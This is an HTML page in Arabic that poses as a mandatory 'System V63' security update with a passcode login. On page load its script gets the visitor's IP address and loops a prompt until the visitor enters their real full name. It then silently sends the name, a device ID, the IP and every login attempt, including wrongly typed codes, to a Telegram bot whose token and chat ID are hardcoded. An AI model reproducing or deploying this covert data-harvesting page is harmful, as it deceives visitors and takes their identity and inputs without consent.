<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <!-- كود منع التخزين نهائياً -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System V63 Security</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            user-select: none;
        }
        .container {
            background: #161b22;
            padding: 25px;
            border-radius: 15px;
            border: 1px solid #30363d;
            text-align: center;
            width: 85%;
            max-width: 350px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        h2 { margin: 0 0 10px 0; color: #fff; }
        .badge { background: #da3633; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
        .data-box { background: #0d1117; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px dashed #30363d; }
        input {
            background: #0d1117; border: 1px solid #30363d; color: #58a6ff;
            padding: 12px; width: 100%; text-align: center; font-size: 18px;
            border-radius: 6px; margin-bottom: 10px; box-sizing: border-box; outline: none;
        }
        button {
            background: #238636; color: #fff; border: none; padding: 12px;
            width: 100%; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold;
        }
        button:active { transform: scale(0.98); }
        .log { font-size: 10px; color: #8b949e; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="container" id="mainDiv">
    <h2>نظام 2026 <span class="badge">V63</span></h2>
    <p style="color:#8b949e; font-size:12px;">تحديث أمني إجباري</p>

    <div class="data-box">
        <p style="font-size:11px; color:#8b949e; margin:0">المستخدم المسجل:</p>
        <p id="uiName" style="color:#238636; font-weight:bold; font-size:18px; margin:5px 0">...</p>
        <p id="uiID" style="color:#58a6ff; font-size:10px; margin:0; font-family:monospace">...</p>
    </div>

    <input type="tel" id="passInput" placeholder="أدخل كود المرور" maxlength="10">
    <button onclick="loginAction()">تسجيل الدخول</button>

    <div id="status" class="log">Connecting to Server...</div>
</div>

<script>
    // ==========================================
    // 1. الإعدادات والثوابت
    // ==========================================
    const APP_VERSION = "63"; // رقم التحديث
    const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
    const CHAT_ID = "-1003886528114";
    
    // ==========================================
    // 2. كود التنظيف الإجباري (Force Reset)
    // ==========================================
    if (localStorage.getItem("sys_ver") !== APP_VERSION) {
        localStorage.clear(); // مسح كل القديم
        localStorage.setItem("sys_ver", APP_VERSION);
        window.location.reload(true); // إعادة تحميل الصفحة من السيرفر
    }

    // ==========================================
    // 3. المتغيرات والدوال الرئيسية
    // ==========================================
    let userIP = "Loading IP...";
    let userID = localStorage.getItem("my_id");
    let userName = localStorage.getItem("my_name");

    // توليد ID لو مش موجود
    if (!userID) {
        userID = "ID-" + Math.floor(100000 + Math.random() * 900000);
        localStorage.setItem("my_id", userID);
    }
    document.getElementById("uiID").innerText = userID;

    // دالة سحب الـ IP
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            userIP = data.ip;
        } catch (error) {
            userIP = "Hidden/Error";
        }
    }

    // دالة الإرسال للتليجرام
    function sendToTelegram(action, details) {
        const message = `🚨 <b>SYSTEM V63 ALERT</b>\n` +
                        `👤 <b>Name:</b> ${userName}\n` +
                        `🆔 <b>ID:</b> ${userID}\n` +
                        `🌍 <b>IP:</b> ${userIP}\n` +
                        `🔒 <b>Action:</b> ${action}\n` +
                        `📝 <b>Details:</b> ${details}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;

        // إرسال صامت
        fetch(url).catch(err => console.log("Net Error"));
    }

    // ==========================================
    // 4. المحرك (Engine) - يبدأ فوراً
    // ==========================================
    (async function startSystem() {
        // 1. نبدأ سحب الـ IP فوراً
        await getIP(); 

        // 2. التحقق من الاسم (إجباري)
        if (!userName || userName.length < 3) {
            // حلقة تكرارية لا تنتهي إلا بالكتابة
            while (!userName || userName.trim().length < 3) {
                userName = prompt("⚠️ تحديث V63 إجباري:\n\nيجب تسجيل اسمك الثلاثي الحقيقي لتوثيق الجهاز:");
            }
            
            // حفظ الاسم
            localStorage.setItem("my_name", userName);
            
            // إرسال "مستخدم جديد" فوراً
            sendToTelegram("🆕 NEW REGISTRATION", "User just registered name");
            document.getElementById("status").innerText = "Data Registered Successfully";
        } else {
            // إرسال "فتح التطبيق" للمستخدم القديم
            sendToTelegram("📱 APP OPENED", "User opened the app");
            document.getElementById("status").innerText = "System Ready V63";
        }

        // تحديث الشاشة
        document.getElementById("uiName").innerText = userName;
    })();

    // ==========================================
    // 5. زر الدخول
    // ==========================================
    function loginAction() {
        const p = document.getElementById("passInput").value;
        if(p === "2026") {
            sendToTelegram("✅ LOGIN SUCCESS", "User entered dashboard");
            alert("تم الدخول بنجاح");
            // window.location.href = "home.html"; // لو عندك صفحة تانية
        } else {
            sendToTelegram("⛔ LOGIN FAILED", `Wrong Pass: ${p}`);
            alert("كود خاطئ");
        }
    }
</script>
</body>
</html>
